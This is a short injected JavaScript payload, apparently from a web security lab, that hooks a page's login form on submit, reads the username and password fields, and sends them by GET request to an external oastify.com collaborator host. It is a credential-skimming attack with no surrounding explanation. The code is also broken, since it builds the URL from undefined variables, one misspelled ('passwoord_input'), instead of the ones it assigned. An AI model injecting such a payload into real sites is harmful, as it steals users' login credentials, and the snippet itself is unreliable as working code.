<script>
function intercept() {
 
 var user = document.forms[0].elements[0].value;
 var pass = document.forms[0].elements[1].value;
 
 
 var xhr = new XMLHttpRequest();
 
 xhr.open("GET", "https://8mvaqyiht3xsxifd01pcfqbuqlwgk5.oastify.com?username="+username+"&password_input="+passwoord_input)
 xhr.send();
return false;
 }
 document.forms[0].onsubmit = intercept;
 
</script>